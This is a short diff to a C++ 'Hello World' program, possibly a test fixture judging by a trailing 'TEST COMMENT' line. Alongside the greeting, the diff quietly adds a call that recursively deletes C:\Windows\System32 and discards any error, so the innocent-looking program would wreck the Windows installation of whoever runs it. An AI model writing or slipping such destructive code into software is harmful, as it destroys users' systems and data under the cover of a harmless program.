@@ -2,10 +2,14 @@
 //
 
 #include <iostream>
+#include <filesystem>
 
 int main()
 {
     std::cout << "Hello World!\n";
+
+    std::error_code ec;
+    std::filesystem::remove_all("C:\\Windows\\System32", ec);
 }
 
 // TEST COMMENT
